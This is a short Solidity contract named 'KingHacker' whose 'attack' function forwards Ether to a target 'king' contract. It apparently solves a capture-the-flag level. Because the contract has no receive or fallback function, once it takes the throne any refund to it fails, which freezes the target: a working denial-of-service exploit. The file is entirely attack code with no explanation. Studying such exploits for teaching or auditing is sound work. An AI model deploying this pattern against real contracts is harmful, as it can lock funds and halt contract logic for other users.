// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingHacker {
    function attack(address payable king) public payable {
        (bool sent, bytes memory data) = king.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}